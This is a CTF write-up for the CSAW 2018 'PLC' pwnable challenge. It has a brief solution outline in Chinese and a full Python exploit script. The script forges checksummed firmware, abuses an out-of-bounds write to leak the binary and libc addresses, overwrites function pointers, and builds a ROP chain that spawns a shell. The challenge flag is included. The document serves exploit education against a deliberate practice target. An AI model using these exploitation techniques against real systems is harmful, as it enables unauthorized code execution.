# PLC

Points: 300

Flag: `flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}`

## Description

> We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges.
> Kinetic damage is necessary, we need you to neutralize these machines.
> 
> You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge
> 
> *NOTE* The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`


## solution

1. 只可以利用wargame平台进行做题，但平台已经提供了反汇编器、main函数的源码、python代码编辑器、gdb调试器。
2. 功能比较简单，按平台步骤提示往下走：
    1. 先分析checksum验证函数，构造能顺序通过checksum检查的固件
    2. 分析xexecutefirmware函数，发现`0x37`可以控制离心机转速，通过多个`0x37`指令，使得离心机转速超标。
    3. 发现`0x32`,可以控制0x32后面一位覆盖核反应堆材料的内存地方，因此会有内存越界写的现象
    4. 调试发现，核反应堆材料的内存地方后面有两个函数指针，因此，可以通过改写函数指针，从而达到`call　anycode`的目的
    5. 调试再发现，在main函数中，有个128字节大小的缓冲区，可以存放ret2syscall的gadget（因为程序disable了libc的system，他的实现方法是改写了execve开头的指令，使其执行abort函数）
    6. 可以通过多次pop　ret,　退到ret2syscall的缓冲区地方，从而顺利拿到shell。

```python
import interact
import sys
import struct


def p16(num):
    return struct.pack("<H", num)


def p64(num):
    return struct.pack("<Q", num)


def u64(sstr):
    res, = struct.unpack("<Q", sstr)
    return res


def u16(sstr):
    res, = struct.unpack("<H", sstr)
    return res


p = interact.Process()

data = p.readuntil('\n')

#p.sendline("S")
p.sendline("U")
#data = p.readuntil('\n')

system_offset = 0x45390
abort_offset = 0x36ec0

one_gg = 0x45216
#one_gg = 0xec0
a = ["\x36", "\x37"]*(0x200-68) + ["\x32", "\x41"]*(68)
a[0] = "F"
a[1] = "W"
a[4] = "9"
a[5] = "9"


def validate_checksum(buf):
    checksum = 0
    for i in range(2, 0x200):
        checksum = ((((((checksum << 12) | (checksum >> 4)) & 0xFFFF) + i)
                     ^ (u16(buf[i*2]+buf[i*2+1])))) & 0xFFFF
    return checksum


checkss = validate_checksum(a)
a[2] = p16(checkss)[0]
a[3] = p16(checkss)[1]

#p.sendline('FW'+"1"*0x400)

p.sendline("".join(a))

p.sendline("E")
p.sendline("S")

p.readuntil("ENRICHMENT MATERIAL: "+"A"*68)
data = p.readuntil('\n').strip().ljust(8, "\x00")
data, = struct.unpack("<Q", data)
# print "llllllllllllllllll: ", hex(data)
bin_base = data - 0xab0
print "bin base: ", hex(bin_base)

a = ["\x36", "\x37"]*(0x200-76) + ["\x32", "\x41"]*(76)
a[0] = "F"
a[1] = "W"
a[4] = "9"
a[5] = "9"
checkss = validate_checksum(a)
a[2] = p16(checkss)[0]
a[3] = p16(checkss)[1]

p.sendline("U")
p.sendline("".join(a))
p.sendline("E")
p.sendline("S")

p.readuntil("ENRICHMENT MATERIAL: "+"A"*76)
data = p.readuntil('\n').strip().ljust(8, "\x00")
data, = struct.unpack("<Q", data)
libc_base = data - abort_offset
print "libc base: ", hex(libc_base)


def convert_addr(buf, instr):
    a = []
    for i in buf:
        a += [instr, i]
    return a


syscall_ret = 0x00000000000bc375 + libc_base
pop_rax_ret = 0x0000000000033544 + libc_base
pop_rdi_ret = 0x0000000000021102 + libc_base
pop_rsi_ret = 0x00000000000202e8 + libc_base
pop_rdx_ret = 0x0000000000001b92 + libc_base
bin_sh = 0x18cd57 + libc_base
pop7_ret = 0x00000000000210f9 + libc_base

pad = p64(pop_rax_ret)
pad += p64(59)
pad += p64(pop_rdi_ret)
pad += p64(bin_sh)
pad += p64(pop_rdx_ret)
pad += p64(0)
pad += p64(pop_rsi_ret)
pad += p64(0)
pad += p64(syscall_ret)

payload = "A"*(76-8-4) + "\x00" * 12 + p64(pop7_ret)  
a = ["\x37", "\x37"]*(0x200-len(payload)) + convert_addr(payload, "\x32")
a[0] = "F"
a[1] = "W"
a[4] = "9"
a[5] = "9"
checkss = validate_checksum(a)
a[2] = p16(checkss)[0]
a[3] = p16(checkss)[1]
p.sendline("U")
p.sendline("".join(a))
p.sendline("E"*8 + pad)
# p.sendline("S")


p.interactive()

```
